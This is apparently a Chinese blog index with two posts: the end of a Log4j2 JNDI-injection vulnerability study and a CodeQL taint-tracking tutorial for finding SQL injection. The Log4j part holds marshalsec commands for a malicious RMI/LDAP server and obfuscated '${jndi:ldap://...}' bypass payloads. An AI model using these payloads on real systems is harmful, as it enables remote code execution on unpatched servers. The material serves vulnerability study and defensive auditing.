\u003cPatternLayout pattern=\"${pattern2}\"/\u003e \u003cSizeBasedTriggeringPolicy size=\"5 MB\"/\u003e \u003c/RollingFile\u003e \u003c/appenders\u003e \u003cloggers\u003e \u003croot level=\"info\"\u003e \u003cappender-ref ref=\"Console\"/\u003e \u003cappender-ref ref=\"RollingFile\"/\u003e \u003c/root\u003e \u003c/loggers\u003e\u003c/configuration\u003e 最后写个demo来触发 package com.example; import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; import java.util.function.LongFunction; public class test { public static void main(String[] args) { Logger logger = LogManager.getLogger(LongFunction.class); String username = \"admin123\"; if (username != null ) { logger.info(\"User {} login in!\", username); } else { logger.error(\"User {} not exists\", username); } } } 可以看到是将登录信息记录到了 myLog.log 中 上面说过了 log4j2 会把 ${} 包裹的进行特殊处理，最后会触发 lookup，以下是一些常见的 lookup 类型 ${date}：获取当前日期和时间，支持自定义格式。 ${pid}：获取当前进程的 ID。 ${logLevel}：获取当前日志记录的级别。 ${sys:propertyName}：获取系统属性的值，例如 ${sys:user.home} 获取用户主目录。 ${env:variableName}：获取环境变量的值，例如 ${env:JAVA_HOME} 获取 Java 安装路径。 ${ctx:key}：获取日志线程上下文（ThreadContext）中指定键的值。 ${class:fullyQualifiedName:methodName}：获取指定类的静态方法的返回值。 ${mdc:key}：获取 MDC (Mapped Diagnostic Context) 中指定键的值。 比如 ${date} ","date":"2025-04-13","objectID":"/posts/cde7a8a/:5:0","tags":["Java"],"title":"Log4j2漏洞学习","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"漏洞分析\r先打下，用marshalsec起个恶意的rmi服务 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://127.0.0.1:9999/#exp\" 9991 ldap 也是这样 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:9999/#exp\" 1099 打个断点调试，来到 org.apache.logging.log4j.core.layout.PatternLayout 下的 toSerializable 方法 这个类中有两个 toSerializable 方法，由于我们在 log4j2.xml 中是使用 \u003cPatternLayout pattern=\"${pattern1}\"/\u003e 这种静态的配置方式，所以最后会调用到第二个 toSerializable 方法中的 this.formatters.length 来获取 ，这个类的源码 public StringBuilder toSerializable(final LogEvent event, final StringBuilder buffer) { int len = this.formatters.length; for(int i = 0; i \u003c len; ++i) { this.formatters[i].format(event, buffer); } if (this.replace != null) { String str = buffer.toString(); str = this.replace.format(str); buffer.setLength(0); buffer.append(str); } return buffer; } 这个类就是将日志内容按 log4j2.xml 文件中规定好的格式那样输出，我们这里的格式为 [%-5p] %d %c - %m%n 所以第七次循环就会处理 %m 也就是我们的日志消息，会调用到 org.apache.logging.log4j.core.pattern.MessagePatternConverter#format 这里的 this.config 就是我们实现log4j2的文件类型，这里是xml，this.noLookups 为 false 则代表启用 ${} 变量替换，这里我们没有在xml中显式规定禁用，所以默认是启用的，而且我们这里本来就需要用到变量替换 然后进入到 if 语句里面，如果检测到 ${ 开头，则取出从 offset 到当前 workingBuilder 末尾的内容，故这里 value 的值就为当时输入的值 然后调用 replace() ，又调用 substitute()，最后会调用到 org.apache.logging.log4j.core.lookup.StrSubstitutor#resolveVariable，这里的调用栈 resolveVariable:1106, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup) replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup) format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern) 其源码 protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf, final int startPos, final int endPos) { StrLookup resolver = this.getVariableResolver(); return resolver == null ? null : resolver.lookup(event, variableName); } resolver解析时支持的关键词有[date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j]，而我们这里利用的jndi:xxx后续就会用到JndiLookup这个解析器，调用栈 lookup:55, JndiLookup (org.apache.logging.log4j.core.lookup) lookup:221, Interpolator (org.apache.logging.log4j.core.lookup) resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup) 最后调用到log4j2原生的 lookup() 方法 ","date":"2025-04-13","objectID":"/posts/cde7a8a/:6:0","tags":["Java"],"title":"Log4j2漏洞学习","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"绕过其防御\r先是绕过 递归解析绕过：log4j2 支持表达式递归解析，下面的表达式会逐层解析，由于 :-是键值对的分隔符，而表达式只管取值，从而使得 {::-j} -\u003e j，类似的可以混淆其他字符。 loggr.info(\"${${::-j}ndi:ldap://127.0.0.1:1099/exp}\"); logger.info(\"${${,:-j}ndi:ldap://127.0.0.1:1099/exp}\") lowwer / upper 绕过：使用 log4j2 支持的关键字，实现大小写绕过 logg.info(\"${${lower:J}ndi:ldap://127.0.0.1:1099/exp}\"); 防御 先是最简单的，更新到最新版本或者安全版本，比如 2.15.0-rc2 安全版本，并确认不开启 JNDI Lookup ，还有些临时应急操作，比如 jvm 添加 -Dlog4j2.formatMsgNoLookups=true 参数（使得noLookup为true，不会进入到lookup中） ","date":"2025-04-13","objectID":"/posts/cde7a8a/:7:0","tags":["Java"],"title":"Log4j2漏洞学习","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"总结\r调用栈 lookup:172, JndiManager (org.apache.logging.log4j.core.net) lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup) lookup:221, Interpolator (org.apache.logging.log4j.core.lookup) resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup) replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup) format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern) format:38, PatternFormatter (org.apache.logging.log4j.core.pattern) toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout) toText:244, PatternLayout (org.apache.logging.log4j.core.layout) encode:229, PatternLayout (org.apache.logging.log4j.core.layout) encode:59, PatternLayout (org.apache.logging.log4j.core.layout) directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config) callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config) callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config) callAppender:84, AppenderControl (org.apache.logging.log4j.core.config) callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config) processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config) log:481, LoggerConfig (org.apache.logging.log4j.core.config) log:456, LoggerConfig (org.apache.logging.log4j.core.config) log:82, AwaitCompletionReliabilityStrategy (org.apache.logging.log4j.core.config) log:161, Logger (org.apache.logging.log4j.core) tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi) logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi) logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi) logMessage:2034, AbstractLogger (org.apache.logging.log4j.spi) logIfEnabled:1899, AbstractLogger (org.apache.logging.log4j.spi) info:1444, AbstractLogger (org.apache.logging.log4j.spi) main:16, test (com.example) sink 点是 lo4j2 包下的 JndiManager#lookup 简单分析下后觉得确实无敌，这么刁钻的角度都能找到，这个漏洞的原理和利用都不难，但从source 分析调用到最后的sink点，真的很强，不愧是阿里，听说是codeql找到的，也不知道是不是真的，但用codeql应该轻松不少 还有更多的绕过和修复，以及更深的利用分析，可以见su18师傅的文章：https://tttang.com/archive/1378/#toc_rc1 ","date":"2025-04-13","objectID":"/posts/cde7a8a/:8:0","tags":["Java"],"title":"Log4j2漏洞学习","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"参考\rhttps://gaorenyusi.github.io/posts/log4j2/ https://jaspersec.top/posts/1237655284.html https://tttang.com/archive/1378/ ","date":"2025-04-13","objectID":"/posts/cde7a8a/:9:0","tags":["Java"],"title":"Log4j2漏洞学习","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"前言\rCodeQL 不多说，帮助我们进行代码审计的一个挺好的工具 ","date":"2025-04-13","objectID":"/posts/28dc684/:1:0","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"CodeQL 安装\rCodeQL本身包含两部分解析引擎+SDK。 解析引擎用来解析我们编写的规则，虽然不开源，但是我们可以直接在官网下载二进制文件直接使用。 SDK完全开源，里面包含大部分现成的漏洞规则，我们也可以利用其编写自定义规则。 ","date":"2025-04-13","objectID":"/posts/28dc684/:2:0","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"引擎安装\r去地址：https://github.com/github/codeql-cli-binaries/releases 下载已经编译好的codeql执行程序，解压之后把codeql文件夹放入～/CodeQL，我这里是 windows ，下的是 codeql-win64.zip 为了方便测试我们需要把ql可执行程序加入到环境变量当中： setx PATH \"E:\\CodeQL\\codeql;%PATH%\" 然后重开个cmd输入 codeql，出现如下图就说明引擎设置完成 ","date":"2025-04-13","objectID":"/posts/28dc684/:2:1","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"SDK安装\r在这边下载规则库文件https://github.com/github/codeql，用来在后续库中进行查询 将解压后的文件放入~/CodeQL中，之后输入codeql pack ls来查看当前SDK中支持的规则集。 ","date":"2025-04-13","objectID":"/posts/28dc684/:2:2","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"VSCode开发插件安装\r在 vscode 中安装 CodeQL 插件 然后在该插件的设置中设置 codeql 的可执行文件路径（路径中最好不要有中文） 然后就设置好了，接下来写个demo测试一下 ","date":"2025-04-13","objectID":"/posts/28dc684/:2:3","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"demo\r由于CodeQL的处理对象并不是源码本身，而是中间生成的AST结构数据库，所以我们先需要把我们的项目源码转换成CodeQL能够识别的CodeDatabase。 切换到源代码所在的目录然后再执行创建数据库的命令 codeql database create \u003c数据库名\u003e --language=\u003c语言标识符\u003e --source-root=\u003c源码路径\u003e 如果源代码是一个Maven项目，可能需要使用Maven命令来构建项目，并在创建数据库时指定该命令 --command=\"mvn clean install\" 不同的 language 所对应的语言标识符 Language Identity C/C++ cpp C# csharp Go go Java java javascript/Typescript javascript Python python 这里我主要是用 codeql 来审计 java 代码，所以用 micro_service_seclab 这个靶场来做测试 codeql database create micro_service_seclab_database --language=\"java\" --command=\"mvn clean install -Dmaven.test.skip=true\" --source-root=E:\\CodeQL\\test\\micro_service_seclab 稍微解释下，在当前目录下创建个 micro_service_seclab_database 当作存放数据库的目录，指定语言为java，然后写出构建和清楚命令，最后指定源代码跟目录 然后在这里把生成的 micro_service_seclab_database 添加进去 然后出现这个就表示数据库加载成功了 接着再添加CodeQL SDK：“文件”-“将文件夹添加到工作区” 然后在 sdk/java/ql 目录下创建个 demo.ql 查询文件，然后 Run Query on Selected Database，就会打印 heloooo test ","date":"2025-04-13","objectID":"/posts/28dc684/:3:0","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"基本语法\r以上面的靶场为例 可以看到 CodeQL 引擎的作用就是帮我们把源码转换为 CodeQL 能识别的数据库，所以我们能做的就是编写 QL 规则，再通过其引擎来运行我们的规则，这样就可以达到一个自动审计的功能 ","date":"2025-04-13","objectID":"/posts/28dc684/:4:0","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"QL语法\rimport java from int i where i = 1 select i 第一行表示我们要引入CodeQL的类库，这里我们以 java 为例 from int i，表示我们定义一个变量i，它的类型是int，表示我们获取所有的int类型的数据 where i = 1, 表示当i等于1的时候，符合条件 select i，表示输出i 如果QL文件在 sdk\\java\\ql\\ 目录中时就不需要 import java 了，因为这是 CodeQL 标准库目录，其会自动隐式加载该目录下的依赖，但如果写在其他目录下就需要手动 import java ，包括其子目录 这里我是写在 sdk\\java\\ql\\examples 下的，上面的代码很好理解，所有int类型的数据中筛选出为1的情况，输出就是 1 QL查询的语法结构为： from [datatype] var where condition(var = something) select var 从上面的例子中我们发现完整的QL语法无非就分三部分，先是限定一个查询的区域，然后写出过滤规则，最后输出 ","date":"2025-04-13","objectID":"/posts/28dc684/:4:1","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"类库\r上面我们说了CodeQL引擎会将代码转换为数据库，这个数据库其实就是可识别的AST数据库 在AST里面Method代表的就是类当中的方法；比如说我们想过的所有的方法调用，MethodAccess获取的就是所有的方法调用。 我们经常会用到的ql类库大体如下： 名称 解释 Method 方法类，Method method表示获取当前项目中所有的方法 MethodAccess 方法调用类，MethodAccess call表示获取当前项目当中的所有方法调用 Parameter 参数类，Parameter表示获取当前项目当中所有的参数 结合ql的语法，我们尝试获取micro-service-seclab项目当中定义的所有方法： import java from Method kkk select kkk 然后添加下过滤条件，筛选出名字为 getStudent 的方法名称 import java from Method k where k.hasName(\"getStudent\") select k.getName(), k.getDeclaringType() k.hashName() 判断名字是否匹配 k.getName() 获取的是当前方法的名称 k.getDeclaringType() 获取的是当前方法所属class的名称 ","date":"2025-04-13","objectID":"/posts/28dc684/:4:2","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"谓词\r如果限制条件比较多，where 语句就会很冗长。CodeQL提供一种机制可以帮助我们把很长的查询语句封装成函数，而这个函数，就叫谓词。 比如上面的案例，我们可以写成如下，获得的结果跟上面是一样的： import java predicate isStudent(Method k) { k.getName()=\"getStudent\" } from Method k where isStudent(k) select k.getName(), k.getDeclaringType() predicate 表示当前方法没有返回值。 ","date":"2025-04-13","objectID":"/posts/28dc684/:4:3","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"设置Source和Sink\r什么是source和sink 在代码自动化安全审计的理论当中，有一个最核心的三元组概念，就是(source，sink和sanitizer) source是指漏洞污染链条的输入点。比如获取http请求的参数部分，就是非常明显的Source sink是指漏洞污染链条的执行点，比如SQL注入漏洞，最终执行SQL语句的函数就是sink(这个函数可能叫query或者exeSql，或者其它) sanitizer又叫净化函数，是指在整个的漏洞链条当中，如果存在一个方法阻断了整个传递链，那么这个方法就叫sanitizer，也就是waf 只有当source和sink同时存在，并且从source到sink的链路是通的，才表示当前漏洞是存在的。 设置Source 在CodeQL中我们通过以下方法来设置Source override predicate isSource(DataFlow::Node src) {} 在这个靶场中，我们使用的是Spring Boot框架，那么source就是http参数入口的代码参数，比如在下面的代码中，source就是username： @RequestMapping(value = \"/one\") public List\u003cStudent\u003e one(@RequestParam(value = \"username\") String username) { return indexLogic.getStudent(username); } 本例中我们设置Source的代码为： override predicate isSource(DataFlow::Node src) { src instanceof RemoteFlowSource } RemoteFlowSource 是 CodeQL 标准库中预定义的 “远程数据源” 类，比如HTTP 请求参数，用户输入以及其他外部输入等都是 这是SDK自带的规则，里面包含了大多常用的Source入口。我们使用的SpringBoot也包含在其中，可以直接使用。 注: instanceof 语法是CodeQL提供的语法，后面在CodeQL进阶部分会提到，这里就是检查获得的 src 是否为 RemoteFlowSource 设置Sink 在CodeQL中我们通过以下方法来设置Sink override predicate isSink(DataFlow::Node sink) {} 在实际中，我们最后都是触发到某个恶意方法，如 getter，setter，所以 sink 应该是个方法，假设我们这里的sink 点是个query方法(Method)的调用(MethodAccess)，所以我们设置Sink为： override predicate isSink(DataFlow::Node sink) { exists(Method method, MethodAccess call | method.hasName(\"query\") and call.getMethod() = method and sink.asExpr() = call.getArgument(0) ) } 这里我们使用了exists子查询，这个是CodeQL谓词语法里非常常见的语法结构，它根据内部的子查询返回true or false，来决定筛选出哪些数据。 sink.asExpr() = call.getArgument(0)：将 sink 节点转换为表达式，并检查它是否等于 call 的第一个参数 故上面sink语句的作用是查找一个query()方法的调用点，并把它的第一个参数设置为sink 在靶场系统(micro-service-seclab)中，sink为 jdbcTemplate.query(sql, ROW_MAPPER); 当刚才设置的source变量流入这个方法时，说明注入点和触发点是通的，就能产生注入漏洞 ","date":"2025-04-13","objectID":"/posts/28dc684/:4:4","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"Flow数据流\r设置好Source和Sink，就相当于搞定了首尾，接下来就是疏通中间的利用链。一个受污染的变量，能够毫无阻拦的流转到危险函数，就表示存在漏洞 这个连通工作就是CodeQL引擎本身来完成的。我们通过使用config.hasFlowPath(source, sink)方法来判断是否连通。 比如如下代码： from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink where config.hasFlowPath(source, sink) select source.getNode(), source, sink, \"source\" 我们传递给config.hasFlowPath(source, sink)我们定义好的source和sink，系统就会自动帮我们判断是否存在漏洞了。 source.getNode()：获取源节点的底层语法树节点（AST Node），显示漏洞源头在代码中的具体位置 ","date":"2025-04-13","objectID":"/posts/28dc684/:4:5","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"代码测试\r","date":"2025-04-13","objectID":"/posts/28dc684/:5:0","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"初步检测\r综上，可以写个 ql 查询代码来检测 sql 注入漏洞 /** * @id java/examples/vuldemo * @name Sql-Injection * @description Sql-Injection * @kind path-problem * @problem.severity warning */ import java import semmle.code.java.dataflow.FlowSources import semmle.code.java.security.QueryInjection import DataFlow::PathGraph class VulConfig extends TaintTracking::Configuration { VulConfig() { this = \"SqlInjectionConfig\"} override predicate isSource(DataFlow::Node src) { src instanceof RemoteFlowSource } override predicate isSink(DataFlow::Node sink) { exists(Method method, MethodAccess call | method.hasName(\"query\") and call.getMethod() = method and sink.asExpr() = call.getArgument(0) ) } } from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink where config.hasFlowPath(source, sink) select source.getNode(), source, sink, \"source\" CodeQL 在定义类上的语法和 Java 类似，其中 extends 的父类 TaintTracking::Configuration 是官方提供用来做数据流分析的通用类，提供很多数据流分析相关的方法，比如isSource(定义source)，isSink(定义sink) src instanceof RemoteFlowSource 表示src 必须是 RemoteFlowSource 类型。在RemoteFlowSource里，官方提供很非常全的source定义，我们本次用到的Springboot的Source就已经涵盖了。 注：上面的注释和其它语言是不一样的，不能够删除，它是程序的一部分，因为在我们生成测试报告的时候，上面注释当中的name，description等信息会写入到审计报告中。 这里的isSource 和isSink 根据自己需要进行重写，而判断中间是否疏通可以使用CodeQL提供的config.hasFlowPath(source, sink)来帮我们处理 可以看到真的很方便，直接把source处和整个从source到sink的链子都显示出来了 这里爆警告说是 DataFlow::PathGraph 在新版本中被弃用了，所以这段代码只能在低版本的规则库里跑 这里开头有 @kind path-problem ，说明结果至少是4列，写了这个结果就会输出完整的污点传播路径，除此之外对输出还有其他要求，比如每列要输出的类型也有要求，但是我这 source.getNode(),source, sink,\"source\" 就能正常输出，source, sink,source.getNode(),\"source\" 却是啥也没有 ","date":"2025-04-13","objectID":"/posts/28dc684/:5:1","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"误报分析\r我们可以看到有一处的 sql 注入，其输入的参数类型为 List\u003cLong\u003e ，不可能存在注入 这里说明我们给的限制并未严格要求参数类型，就会导致以上的误报产生，我们可以用 isSanitizer 来避免这种情况 isSanitizer是CodeQL的类TaintTracking::Configuration提供的净化方法。它的函数原型是： override predicate isSanitizer(DataFlow::Node node) {} 在CodeQL自带的默认规则里，对当前节点是否为基础类型做了判断 override predicate isSanitizer(DataFlow::Node node) { node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType or node.getType() instanceof NumberType } 表示如果当前节点是上面提到的基础类型，那么此污染链将被净化阻断，漏洞将不存在，可以看到这里默认规则只是一些基础类型，没有类似 List\u003clong\u003e 等的复合类型 我们将 TaintTracking::Configuration 中的 isSanitizer 重写下就好了 override predicate isSanitizer(DataFlow::Node node) { node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType or node.getType() instanceof NumberType or exists(ParameterizedType pt| node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType ) // 这里的 ParameterizedType 代表所有泛型，判断泛型当中的传参是否为 Number 型 } 这样在检测到 List\u003clong\u003e 时就会将其净化掉，这样链子就不通了，也就不会出现误报的情况 ","date":"2025-04-13","objectID":"/posts/28dc684/:5:2","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"漏报补充\r我们发现如下 sql 注入没有被捕捉到（参考文章是这样写的，但我这是捕捉到了的） public List\u003cStudent\u003e getStudentWithOptional(Optional\u003cString\u003e username) { String sqlWithOptional = \"select * from students where username like '%\" + username.get() + \"%'\"; //String sql = \"select * from students where username like ?\"; return jdbcTemplate.query(sqlWithOptional, ROW_MAPPER); } 宁可错杀一百不可放过一个，在代码审计中是如此，误报可能需要花费时间去筛选，但是漏报的损失则无法挽回 在 CodeQL 中，我们可以通过 isAdditionalTaintStep 方法来将断了的节点给它强制连接上 isAdditionalTaintStep 方法是CodeQL的类TaintTracking::Configuration提供的的方法，它的原型是： override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) {} 它的作用是将一个可控节点，比如A强制传递给另外一个节点B，那么节点B也就成了可控节点。 假设这里是 username.get() 这一步断掉了，我们可以强制让 username 流转到 username.get() ，代码为 /** * @id java/examples/vuldemo * @name Sql-Injection * @description Sql-Injection * @kind path-problem * @problem.severity warning */ import java import semmle.code.java.dataflow.FlowSources import semmle.code.java.security.QueryInjection import DataFlow::PathGraph predicate isTaintedString(Expr expSrc, Expr expDest) { exists(Method method, MethodAccess call, MethodAccess call1 | expSrc = call1.getArgument(0) and expDest=call and call.getMethod() = method and method.hasName(\"get\") and method.getDeclaringType().toString() = \"Optional\u003cString\u003e\" and call1.getArgument(0).getType().toString() = \"Optional\u003cString\u003e\" ) } class VulConfig extends TaintTracking::Configuration { VulConfig() { this = \"SqlInjectionConfig\" } override predicate isSource(DataFlow::Node src) { src instanceof RemoteFlowSource } override predicate isSanitizer(DataFlow::Node node) { node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType or node.getType() instanceof NumberType or exists(ParameterizedType pt| node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType ) } override predicate isSink(DataFlow::Node sink) { exists(Method method, MethodAccess call | method.hasName(\"query\") and call.getMethod() = method and sink.asExpr() = call.getArgument(0) ) } override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) { isTaintedString(node1.asExpr(), node2.asExpr()) } } from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink where config.hasFlowPath(source, sink) select source.getNode(), source, sink, \"source\" expSrc = call1.getArgument(0)：规定了污染源为第一个参数 expDest = call and call.getMethod() = method and method.hasName(\"get\")：规定了污染目标为 xxx.get() method.getDeclaringType().toString() = \"Optional\u003cString\u003e\" and call1.getArgument(0).getType().toString() = \"Optional\u003cString\u003e\" ：规定了污染源和污染目标的类型为Optional\u003cString\u003e ","date":"2025-04-13","objectID":"/posts/28dc684/:5:3","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"Lombok问题解决\rLombok是一个非常有名的Java类库，在开发中应该经常遇到，它通过简单的注解来帮助我们简化消除一些必须有但显得很臃肿的Java代码的工具，比如我们可以不用编写 getter，setter demo public class Student { private int id; private String username; public void setId(int id) { this.id = id; } public int getId() { return id; } public String getUsername() { return username; } public void setUsername(String username) { this.username = username; } } 当我们使用 Lombok 的注解，就不需要手动编写 getter 和 setter，以下代码等同于上面的 demo import lombok.Data; @Data public class Student { private int id; private String username; private int sex; private int age; } 可以看到用了 lombok 注解后就没有了 getter 和 setter，这就会导致 CodeQL 不能正常检测，source 到 sink 的链条断裂，从而造成漏报 有两种解决办法，第一种是在 pom.xml 中加入依赖，再重新编译即可 \u003cbuild\u003e \u003csourceDirectory\u003etarget/generated-sources/delombok\u003c/sourceDirectory\u003e \u003ctestSourceDirectory\u003etarget/generated-test-sources/delombok\u003c/testSourceDirectory\u003e \u003cplugins\u003e \u003cplugin\u003e \u003cgroupId\u003eorg.projectlombok\u003c/groupId\u003e \u003cartifactId\u003elombok-maven-plugin\u003c/artifactId\u003e \u003cversion\u003e1.18.20.0\u003c/version\u003e \u003cexecutions\u003e \u003cexecution\u003e \u003cid\u003edelombok\u003c/id\u003e \u003cphase\u003egenerate-sources\u003c/phase\u003e \u003cgoals\u003e \u003cgoal\u003edelombok\u003c/goal\u003e \u003c/goals\u003e \u003cconfiguration\u003e \u003caddOutputDirectory\u003efalse\u003c/addOutputDirectory\u003e \u003csourceDirectory\u003esrc/main/java\u003c/sourceDirectory\u003e \u003c/configuration\u003e \u003c/execution\u003e \u003cexecution\u003e \u003cid\u003etest-delombok\u003c/id\u003e \u003cphase\u003egenerate-test-sources\u003c/phase\u003e \u003cgoals\u003e \u003cgoal\u003etestDelombok\u003c/goal\u003e \u003c/goals\u003e \u003cconfiguration\u003e \u003caddOutputDirectory\u003efalse\u003c/addOutputDirectory\u003e \u003csourceDirectory\u003esrc/test/java\u003c/sourceDirectory\u003e \u003c/configuration\u003e \u003c/execution\u003e \u003c/executions\u003e \u003c/plugin\u003e \u003cplugin\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-maven-plugin\u003c/artifactId\u003e \u003c/plugin\u003e \u003c/plugins\u003e \u003c/build\u003e 第二种是有人在 issue 中提出的：https://github.com/github/codeql/issues/4984 # get a copy of lombok.jar wget https://projectlombok.org/downloads/lombok.jar -O \"lombok.jar\" # run \"delombok\" on the source files and write the generated files to a folder named \"delombok\" java -jar \"lombok.jar\" delombok -n --onlyChanged . -d \"delombok\" # remove \"generated by\" comments find \"delombok\" -name '*.java' -exec sed '/Generated by delombok/d' -i '{}' ';' # remove any left-over import statements find \"delombok\" -name '*.java' -exec sed '/import lombok/d' -i '{}' ';' # copy delombok'd files over the original ones cp -r \"delombok/.\" \"./\" # remove the \"delombok\" folder rm -rf \"delombok\" 两种方法都是去掉 lombok 注解，并还原 setter 和 getter 方法，实现手法不一样罢了，貌似第一种更方便，不知道为啥我这啥都没修改还是检测出来了 ","date":"2025-04-13","objectID":"/posts/28dc684/:5:4","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"批量化实现\r以上 ql 规则可以成功跑出靶场的 sql 注入漏洞，我们也可以将其运用到其他项目上，先生成相应的数据库，然后再用写好的 ql 文件去分析就好，codeql 命令为 codeql database analyze /CodeQL/databases/micro-service-seclab /CodeQL/ql/java/ql/examples/demo --format=csv --output=/CodeQL/Result/micro-service-seclab.csv --rerun ","date":"2025-04-13","objectID":"/posts/28dc684/:5:5","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"CodeQL进阶\r","date":"2025-04-13","objectID":"/posts/28dc684/:6:0","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"instanceof语法糖\ra instanceof b 上面语句就是检测 a 对象是否是 b 类型 在遇到复杂的类型时，可能要用多个 exist 子查询语句，但是只用一个 instanceof 语句就好，而且只要匹配一个抽象类，就能匹配到这个抽象类下的所有子类，比如 class MyCustomSource extends RemoteFlowSource 如果 x 为 MyCustomSource 类型，则 x instanceof RemoteFlowSource 会返回true ","date":"2025-04-13","objectID":"/posts/28dc684/:6:1","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"递归\rCodeQL里面的递归调用语法是：在谓词方法的后面跟*或者+，来表示调用0次以上和1次以上（和正则类似），0次会打印自己。 demo package org.example; public class hello { public class StudentService { class innerOne { public innerOne(){} class innerTwo { public innerTwo(){} public String Nihao() { return \"Nihao\"; } } public String Hi(){ return \"hello\"; } } } } 此时如果想要根据innerTwo类定位到最外层的 hello 类 我们可以用以下 ql 查询语句来获得，调用两次 getEnclosingType 方法即可 import java from Class classes where classes.getName().toString() = \"innerTwo\" select classes.getEnclosingType().getEnclosingType().getEnclosingType() // getEnclosingtype获取作用域 但是实际情况我们不知道要调用几次，而且这样写也比较麻烦 这时候就可以用到递归了，我们在调用方法后面加*(从自身开始调用)或者+(从上一级开始调用)，来解决此问题。 from Class classes where classes.getName().toString() = \"innerTwo\" select classes.getEnclosingType+() // 获取作用域 + 是从上一级开始调用 * 是从自身开始调用 自己封装方法来实现递归调用也是可以的，比如这里我这只想找相差一层的类 import java RefType demo(Class classes) { result = classes.getEnclosingType().getEnclosingType() } from Class classes where classes.getName().toString() = \"innerTwo\" select demo*(classes) // 获取作用域 ","date":"2025-04-13","objectID":"/posts/28dc684/:6:2","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"强制类型转换\r在 CodeQL 中可以用 getType() 来对返回结果做强制类型转换 查询下当前数据库中所有的参数及其类型 import java from Parameter param select param, param.getType() 可以看到有5k多条而且有不同类型的参数，强制转换下，只留下是整型的参数 只有1k多条了，而且只含有整型的 ","date":"2025-04-13","objectID":"/posts/28dc684/:6:3","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"总结\r综上可以知道CodeQL的强大了，稍微入了下门，知道怎么用了，难点就在于规则的编写，最主要的就是source，sink和中间Sanitizer的编写 接下来就是找案例来练手了 